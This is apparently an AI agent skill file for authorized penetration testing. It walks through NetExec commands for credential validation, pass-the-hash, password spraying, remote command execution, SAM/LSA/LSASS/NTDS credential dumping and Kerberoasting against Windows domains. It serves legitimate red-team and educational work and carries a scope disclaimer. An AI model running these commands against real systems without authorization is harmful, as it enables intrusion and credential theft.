---
name: moving-laterally-with-netexec
description: Use NetExec (nxc) to validate credentials, enumerate SMB shares/users/policy, password-spray safely across lockout thresholds, execute commands, and dump SAM/LSA/NTDS credentials across SMB, WinRM, LDAP, MSSQL, SSH, and other protocol modules.
subdomain: penetration-testing
facing: config
mitre_attack:
- T1021.002
nist_csf:
- DE.CM-01
upstream: moving-laterally-with-netexec@54a7988 Apache-2.0, modified by wesh
---
> Authorized use only: written scope / rules of engagement first. Refuse targets outside scope.
> Legal: This skill is for authorized penetration testing, red-team engagements, and educational labs only. NetExec authenticates to, executes code on, and extracts credentials from remote hosts. Running it against systems you do not own or lack explicit written authorization to test is illegal under computer-misuse laws (e.g. the US CFAA, UK Computer Misuse Act). Confirm scope and rules of engagement before use.

## Prerequisites

- Linux operator host (Kali/Parrot/Ubuntu). Install via pipx (recommended):
  ```bash
  sudo apt install -y pipx git
  pipx ensurepath
  pipx install git+https://github.com/Pennyw0rth/NetExec
  # verify
  nxc --version
  nxc smb --help
  ```
- Docker alternative:
  ```bash
  git clone https://github.com/Pennyw0rth/NetExec
  cd NetExec
  docker build -t netexec .
  docker run --rm -it netexec smb --help
  ```
- Network reachability to target ports (445/SMB, 5985-5986/WinRM, 389-636/LDAP, 1433/MSSQL).
- Valid credentials, NT hashes, or Kerberos tickets within authorized scope.
- Signed rules-of-engagement document and knowledge of account-lockout policy before spraying.

## MITRE ATT&CK Mapping

| Technique ID | Official Name | How NetExec Implements It |
|--------------|---------------|---------------------------|
| T1021.002 | Remote Services: SMB/Windows Admin Shares | Authenticates over SMB to `ADMIN$`/`C$` and executes code on remote hosts (`-x`, `--exec-method`) |
| T1110.003 | Brute Force: Password Spraying | One password against many accounts with `--continue-on-success` |
| T1003.002 | OS Credential Dumping: Security Account Manager | `--sam` dumps local SAM hashes |
| T1003.004 | OS Credential Dumping: LSA Secrets | `--lsa` dumps LSA secrets and cached credentials |
| T1003.006 | OS Credential Dumping: DCSync | `--ntds` via drsuapi extracts domain database |
| T1558.003 | Steal or Forge Kerberos Tickets: Kerberoasting | `ldap --kerberoasting` requests service tickets |
| T1087.002 | Account Discovery: Domain Account | `--users`, `--rid-brute` enumerate domain accounts |
| T1135 | Network Share Discovery | `--shares`, `-M spider_plus` enumerate accessible shares |

## Workflow

### 1. Validate credentials and find admin access

Sweep subnet with credential pair or NT hash. Trailing `(Pwn3d!)` marks hosts where principal has admin code execution — these are your lateral-movement targets.
```bash
# Cleartext password across a /24
nxc smb 192.168.1.0/24 -u jsmith -p 'Summer2025!' -d corp.local

# Pass-the-hash (NT only or LM:NT)
nxc smb 192.168.1.0/24 -u Administrator -H '13b29964cc2480b4ef454c59562e675c'
nxc smb 10.10.10.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c' --local-auth
```

### 2. Enumerate environment

Pull users, shares, password policy, loggedon sessions, and active sessions to plan movement.
```bash
nxc smb dc01.corp.local -u jsmith -p 'Summer2025!' --users
nxc smb dc01.corp.local -u jsmith -p 'Summer2025!' --pass-pol
nxc smb 192.168.1.0/24 -u jsmith -p 'Summer2025!' --shares
nxc smb 192.168.1.0/24 -u jsmith -p 'Summer2025!' --loggedon-users --sessions
# RID brute for accounts when listing is blocked
nxc smb dc01.corp.local -u jsmith -p 'Summer2025!' --rid-brute 10000
```

### 3. Password-spray safely

Spray one password against user list, staying under lockout threshold. `--continue-on-success` keeps testing every account instead of stopping at first hit.
```bash
# Discover the lockout policy FIRST
nxc smb dc01.corp.local -u jsmith -p 'Summer2025!' --pass-pol

# Spray a single password across many users
nxc smb dc01.corp.local -u users.txt -p 'Welcome2025!' --continue-on-success

# Validate a credential set across the domain without bruteforcing
nxc ldap dc01.corp.local -u users.txt -p 'Spring2025!' --continue-on-success --no-bruteforce
```

### 4. Execute commands on authorized hosts

On `(Pwn3d!)` targets, run commands and choose quieter execution channel when needed.
```bash
# Default execution
nxc smb 192.168.1.50 -u Administrator -H <hash> -x 'whoami /all'

# Pick an exec method: smbexec, wmiexec, atexec, mmcexec
nxc smb 192.168.1.50 -u Administrator -H <hash> --exec-method wmiexec -x 'hostname'

# PowerShell over WinRM (amsi-bypassed, base64-encoded transparently)
nxc winrm 192.168.1.50 -u Administrator -H <hash> -X '$PSVersionTable'
```

### 5. Dump credentials

Harvest local and domain credentials from authorized hosts to fuel further movement.
```bash
# Local SAM hashes and LSA secrets
nxc smb 192.168.1.50 -u Administrator -H <hash> --sam --lsa

# In-memory LSASS dump via the lsassy module
nxc smb 192.168.1.50 -u Administrator -H <hash> -M lsassy

# Domain database from a DC (DRSUAPI default, or VSS)
nxc smb dc01.corp.local -u Administrator -H <hash> --ntds
nxc smb dc01.corp.local -u Administrator -H <hash> --ntds vss
```

### 6. Drive AD attacks via LDAP and modules

Use protocol modules to pivot to ticket attacks, delegation, LAPS, and BloodHound ingestion.
```bash
# Kerberoasting and ASREPRoasting
nxc ldap dc01.corp.local -u jsmith -p 'Summer2025!' --kerberoasting kerb.out
nxc ldap dc01.corp.local -u jsmith -p 'Summer2025!' --asreproast asrep.out

# Read LAPS passwords where permitted
nxc ldap dc01.corp.local -u jsmith -p 'Summer2025!' -M laps

# Collect BloodHound data
nxc ldap dc01.corp.local -u jsmith -p 'Summer2025!' --bloodhound --collection All --dns-server 192.168.1.10

# MSSQL command/query execution
nxc mssql 192.168.1.60 -u sa -p 'Sql2025!' --local-auth -q 'SELECT name FROM sys.databases'
nxc mssql 192.168.1.60 -u sa -p 'Sql2025!' --local-auth -x 'whoami'
```

### 7. Review workspace and report

NetExec stores results in per-protocol SQLite workspace under `~/.nxc/`. Review captured credentials and admin relationships for report.
```bash
nxc smb -L              # list SMB modules
ls ~/.nxc/workspaces/
nxc smb 192.168.1.0/24 -u jsmith -p 'Summer2025!' --shares --log spray_results.log
```

## Tools and Resources

| Tool | Purpose | Source |
|------|---------|--------|
| NetExec (`nxc`) | Multi-protocol network exploitation | https://github.com/Pennyw0rth/NetExec |
| NetExec Wiki | Official docs and per-protocol flags | https://www.netexec.wiki/ |
| Impacket | Underlying SMB/MSSQL/Kerberos libraries | https://github.com/fortra/impacket |
| lsassy | Remote LSASS extraction (NetExec module) | https://github.com/login-securite/lsassy |
| BloodHound CE | Graph analysis of collected AD data | https://github.com/SpecterOps/BloodHound |
| NetExec Cheat Sheet | Command reference | https://www.stationx.net/netexec-cheat-sheet/ |

## Validation Criteria

- [ ] NetExec installed and `nxc --version` confirmed.
- [ ] Account-lockout policy reviewed before any spraying.
- [ ] Credentials validated across in-scope host range.
- [ ] `(Pwn3d!)` admin-access hosts enumerated and documented.
- [ ] Shares, users, and password policy collected.
- [ ] Password spraying performed under lockout thresholds with `--continue-on-success`.
- [ ] Command execution tested with appropriate `--exec-method`.
- [ ] Credential dumping (`--sam`/`--lsa`/`--ntds`) performed only on authorized targets.
- [ ] LDAP attacks (Kerberoasting/ASREPRoast/LAPS/BloodHound) executed where in scope.
- [ ] Workspace results exported and included in engagement report.

Not vendored (scripts/, references/): https://github.com/mukul975/Anthropic-Cybersecurity-Skills/tree/54a798831d2266a3ca61ce68a7acb80b81160d57/skills/moving-laterally-with-netexec
